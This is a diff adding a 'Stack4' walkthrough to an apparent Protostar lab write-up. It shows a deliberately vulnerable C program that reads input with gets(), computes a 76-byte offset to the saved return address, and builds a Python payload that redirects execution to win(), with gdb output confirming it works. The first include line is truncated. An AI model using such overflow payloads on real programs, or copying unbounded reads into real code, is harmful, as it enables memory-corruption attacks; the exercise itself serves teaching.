@@ -284,3 +284,86 @@ user@protostar:/opt/protostar/bin$ python -c "print '\x41' * 64 + '\x24\x84\x04\
 calling function pointer, jumping to 0x08048424
 code flow successfully changed
 ```
+
+## Stack4
+
+```c
+nclude <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+
+This time we have to overwrite EIP to control the program flow after the main function returns.  
+After the function prologue gcc aligns the stack by rounding down to the nearest multiple of 16. We have to take this into consideration when we calculate the size of our payload!
+
+```asm
+0x08048408 <main+0>:    push   ebp
+0x08048409 <main+1>:    mov    ebp,esp
+0x0804840b <main+3>:    and    esp,0xfffffff0 ; stack alignment
+0x0804840e <main+6>:    sub    esp,0x50       ; reserve space on stack
+```
+
+So after this the stack looks like this. The penultimate address `0xbffff7f8` is the EBP of the old stack frame and `0xb7eadc76` is the return address we want to overwrite.
+```bash
+(gdb) x/24xw $esp
+0xbffff720:     0xb7fd7ff4      0xb7ec6165      0xbffff738      0xb7eada75
+0xbffff730:     0xb7fd7ff4      0x080495ec      0xbffff748      0x080482e8
+0xbffff740:     0xb7ff1040      0x080495ec      0xbffff778      0x08048449
+0xbffff750:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffff778
+0xbffff760:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
+0xbffff770:     0x08048430      0x00000000      0xbffff7f8      0xb7eadc76
+```
+
+To calculate the required bytes to reach EIP we have to do some math. We store old EBP (`+4`). Then we do some stack alignment (`+8`). We allocate some space on the stack (`+80`) but our buffer starts at `ESP+0x10` (`-16`).
+```
+80 - 16 + 8 (alignment) + 4 (old EBP) = 76
+```
+
+Here is how the stack looks like
+```
+.--------------------.
+|  saved EIP         |
+.--------------------.
+|  saved EBP         |
+.--------------------.
+|  8 byte alignment  | ; and esp, 0xfffffff0
+.--------------------.  
+|                    | ; sub esp, 0x50 (80)
+|                    | 
+|  buffer[64]        | 
+|                    | 
+|                    | 
+|                    | 
+.--------------------. <- ESP+0x10
+|  16 bytes          | 
+.--------------------. <- ESP
+```
+
+So 76 bytes padding are required before we land at EIP. EIP itself is replaced with the address of the `win` function. 
+```bash
+$ objdump -Fd ./stack4 | grep win
+080483f4 <win> (File Offset: 0x3f4):
+$ python -c "import sys; sys.stdout.write('A' * 76 + '\xF4\x83\x04\x08')" > /tmp/stack4_input
+$ gdb -q ./stack4
+Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) run < /tmp/stack4_input
+Starting program: /opt/protostar/bin/stack4 < /tmp/stack4_input
+code flow successfully changed
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+(gdb)
+```
